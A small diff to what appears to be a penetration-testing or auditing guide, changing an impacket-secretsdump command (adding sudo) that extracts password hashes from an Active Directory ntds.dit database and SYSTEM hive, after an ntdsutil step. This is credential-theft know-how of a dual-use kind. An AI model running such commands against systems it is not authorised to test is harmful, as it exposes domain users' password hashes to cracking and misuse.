@@ -29,7 +29,7 @@ ntdsutil: quit
 ```
 2. Extract hashes using `impacket-secretsdump`:
 ```
-impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -outputfile hashes LOCAL
+sudo impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -outputfile hashes LOCAL
 ```
 3. Separate user accounts:
 ```
